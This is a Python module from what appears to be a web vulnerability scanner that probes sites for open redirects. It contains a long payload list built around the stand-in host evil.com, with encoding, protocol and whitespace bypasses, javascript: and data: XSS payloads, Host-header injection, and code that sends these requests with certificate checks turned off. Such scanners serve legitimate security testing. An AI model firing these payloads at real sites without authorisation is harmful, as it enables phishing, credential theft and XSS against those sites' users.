"""
Vexor Open Redirect Scanner v3.0 - Elite Level
URL param redirect, path-based redirect, header-based redirect,
encoding bypass, protocol bypass, XSS via redirect, OAuth redirect abuse
"""
import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from vexor.modules.base import BaseScanner, Finding


# ─── Redirect Payloads ────────────────────────────────────────────────────────
REDIRECT_PAYLOADS = [
    # Basic
    "https://evil.com",
    "https://evil.com/",
    "http://evil.com",
    "//evil.com",
    "//evil.com/",
    # Protocol bypass
    "https:evil.com",
    "https:\\\\evil.com",
    "https:/\\evil.com",
    "https:\\/evil.com",
    # Path bypass
    "/\\evil.com",
    "/%09/evil.com",
    "/%2F/evil.com",
    "/%5Cevil.com",
    # Encoding bypass
    "https://evil%E3%80%82com",
    "https://evil%2ecom",
    "https://evil%252ecom",
    "https://evil.com%23@legitimate.com",
    "https://legitimate.com@evil.com",
    # Subdomain confusion
    "https://evil.com.legitimate.com",
    "https://legitimate.com.evil.com",
    # Null byte
    "https://evil.com%00.legitimate.com",
    # JavaScript
    "javascript:alert(1)",
    "javascript://evil.com/%0aalert(1)",
    # Data URI
    "data:text/html,<script>alert(1)</script>",
    # Whitespace
    " https://evil.com",
    "\thttps://evil.com",
    "\nhttps://evil.com",
    # Double slash
    "///evil.com",
    "////evil.com",
    # Unicode
    "https://evil\u2024com",
    # Backslash
    "https://evil.com\\@legitimate.com",
]

# ─── Redirect Parameters ──────────────────────────────────────────────────────
REDIRECT_PARAMS = [
    "redirect", "redirect_uri", "redirect_url", "redirectUrl", "redirectUri",
    "return", "return_url", "returnUrl", "returnTo", "return_to",
    "next", "next_url", "nextUrl",
    "url", "goto", "go",
    "target", "destination", "dest",
    "redir", "r", "ref",
    "continue", "cont",
    "forward", "fwd",
    "to", "out",
    "view", "callback",
    "success_url", "cancel_url", "failure_url",
    "login_redirect", "logout_redirect",
    "after_login", "after_logout",
    "back", "backUrl", "back_url",
    "from", "from_url",
    "location", "href",
]

# ─── Headers that can cause redirects ────────────────────────────────────────
REDIRECT_HEADERS = [
    "Referer",
    "X-Forwarded-Host",
    "Host",
    "X-Original-URL",
]


class Scanner(BaseScanner):
    """Open Redirect Scanner v3.0 - Elite Level"""

    MODULE_NAME = "open_redirect"
    MODULE_DESC = "Open Redirect: URL/Path/Header/Encoding-Bypass/XSS/OAuth"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._scan_url_params(),
                self._scan_path_based(),
                self._scan_header_based(),
                self._scan_post_params(),
                self._scan_meta_refresh(),
                return_exceptions=True,
            )
        return self.findings

    async def _scan_url_params(self) -> None:
        """Test URL parameters for open redirect"""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        # Test existing params that look like redirect params
        for param in params:
            if param.lower() in [p.lower() for p in REDIRECT_PARAMS]:
                await self._test_redirect_param(self.target, param)

        # Test common redirect params even if not in URL
        for param in REDIRECT_PARAMS[:15]:
            await self._test_redirect_param(self.target, param)

    async def _test_redirect_param(self, url: str, param: str) -> None:
        """Test a parameter for open redirect with all bypass techniques"""
        for payload in REDIRECT_PAYLOADS:
            try:
                test_url = self._inject_param(url, param, payload)

                import httpx
                async with httpx.AsyncClient(
                    verify=False, timeout=10, follow_redirects=False
                ) as client:
                    resp = await client.get(test_url)

                if resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get("location", "")

                    if self._is_evil_redirect(location):
                        # Determine severity
                        if "javascript:" in payload.lower() or "data:" in payload.lower():
                            severity = "HIGH"
                            vuln_name = "Open Redirect → XSS"
                        else:
                            severity = "MEDIUM"
                            vuln_name = "Open Redirect"

                        self.add_finding(Finding(
                            severity=severity,
                            module=self.MODULE_NAME,
                            vuln=vuln_name,
                            endpoint=url,
                            param=param,
                            payload=payload,
                            evidence=(
                                f"Redirects to: {location}\n"
                                f"HTTP {resp.status_code}"
                            ),
                            description=(
                                f"Open redirect in parameter '{param}'. "
                                f"Redirects to attacker-controlled URL: {location}. "
                                "Can be used for phishing, credential theft, OAuth abuse."
                            ),
                            remediation=(
                                "Validate redirect URLs against a strict whitelist. "
                                "Use relative paths instead of full URLs. "
                                "Reject URLs with different domains."
                            ),
                        ))
                        return

                # Also check if redirect URL is in response body (meta refresh, JS redirect)
                if resp.status_code == 200:
                    if self._is_evil_in_body(resp.text, payload):
                        self.add_finding(Finding(
                            severity="MEDIUM",
                            module=self.MODULE_NAME,
                            vuln="Open Redirect (Client-Side)",
                            endpoint=url,
                            param=param,
                            payload=payload,
                            evidence=f"Redirect URL reflected in response body",
                            description=(
                                f"Client-side open redirect in '{param}'. "
                                "Redirect URL is reflected in JavaScript or meta refresh."
                            ),
                            remediation="Validate redirect URLs server-side before reflecting.",
                        ))
                        return

            except Exception:
                continue

    async def _scan_path_based(self) -> None:
        """Test path-based open redirects"""
        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Common path-based redirect patterns
        path_patterns = [
            "/redirect?url=https://evil.com",
            "/redirect/https://evil.com",
            "/out?url=https://evil.com",
            "/go?url=https://evil.com",
            "/link?url=https://evil.com",
            "/external?url=https://evil.com",
            "/proxy?url=https://evil.com",
        ]

        for pattern in path_patterns:
            url = base + pattern
            try:
                import httpx
                async with httpx.AsyncClient(
                    verify=False, timeout=8, follow_redirects=False
                ) as client:
                    resp = await client.get(url)

                if resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get("location", "")
                    if self._is_evil_redirect(location):
                        self.add_finding(Finding(
                            severity="MEDIUM",
                            module=self.MODULE_NAME,
                            vuln="Open Redirect (Path-Based)",
                            endpoint=url,
                            evidence=f"Redirects to: {location}",
                            description=f"Path-based open redirect at {pattern}",
                            remediation="Validate redirect destinations against whitelist.",
                        ))
                        return
            except Exception:
                continue

    async def _scan_header_based(self) -> None:
        """Test header-based redirects (Host header injection)"""
        evil_host = "evil.com"

        for header in REDIRECT_HEADERS:
            try:
                import httpx
                async with httpx.AsyncClient(
                    verify=False, timeout=8, follow_redirects=False
                ) as client:
                    resp = await client.get(
                        self.target,
                        headers={header: evil_host},
                    )

                if resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get("location", "")
                    if evil_host in location:
                        self.add_finding(Finding(
                            severity="HIGH",
                            module=self.MODULE_NAME,
                            vuln=f"Open Redirect via {header} Header",
                            endpoint=self.target,
                            param=header,
                            payload=evil_host,
                            evidence=f"Redirect to: {location} via {header}: {evil_host}",
                            description=(
                                f"Host header injection causes redirect to attacker domain. "
                                "Can be used for password reset poisoning and phishing."
                            ),
                            remediation=(
                                "Validate Host header against whitelist. "
                                "Use absolute URLs from config for redirects."
                            ),
                        ))
                        return
            except Exception:
                continue

    async def _scan_post_params(self) -> None:
        """Test POST parameters for open redirect"""
        for param in REDIRECT_PARAMS[:10]:
            for payload in REDIRECT_PAYLOADS[:5]:
                try:
                    import httpx
                    async with httpx.AsyncClient(
                        verify=False, timeout=8, follow_redirects=False
                    ) as client:
                        resp = await client.post(
                            self.target,
                            data={param: payload},
                        )

                    if resp.status_code in [301, 302, 303, 307, 308]:
                        location = resp.headers.get("location", "")
                        if self._is_evil_redirect(location):
                            self.add_finding(Finding(
                                severity="MEDIUM",
                                module=self.MODULE_NAME,
                                vuln="Open Redirect (POST Parameter)",
                                endpoint=self.target,
                                param=param,
                                payload=payload,
                                evidence=f"POST redirect to: {location}",
                                description=f"Open redirect via POST parameter '{param}'.",
                                remediation="Validate redirect URLs in POST parameters.",
                            ))
                            return
                except Exception:
                    continue

    async def _scan_meta_refresh(self) -> None:
        """Check for meta refresh redirects with user-controlled URLs"""
        resp = await self.get(self.target)
        if not resp:
            return

        # Check for meta refresh
        meta_pattern = re.compile(
            r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\']?\d+;\s*url=([^"\'>\s]+)',
            re.IGNORECASE,
        )
        matches = meta_pattern.findall(resp.text)
        for url in matches:
            if url.startswith("http") and urlparse(url).netloc != urlparse(self.target).netloc:
                self.add_finding(Finding(
                    severity="LOW",
                    module=self.MODULE_NAME,
                    vuln="Meta Refresh Redirect to External Domain",
                    endpoint=self.target,
                    evidence=f"<meta http-equiv=refresh> redirects to: {url}",
                    description="Page uses meta refresh to redirect to external domain.",
                    remediation="Review meta refresh redirects for legitimacy.",
                ))

    def _is_evil_redirect(self, location: str) -> bool:
        """Check if redirect location points to evil.com"""
        if not location:
            return False
        return (
            "evil.com" in location
            or location.startswith("//evil")
            or "javascript:" in location.lower()
            or "data:" in location.lower()
        )

    def _is_evil_in_body(self, body: str, payload: str) -> bool:
        """Check if evil redirect URL appears in response body"""
        return "evil.com" in body and payload in body

    def _inject_param(self, url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
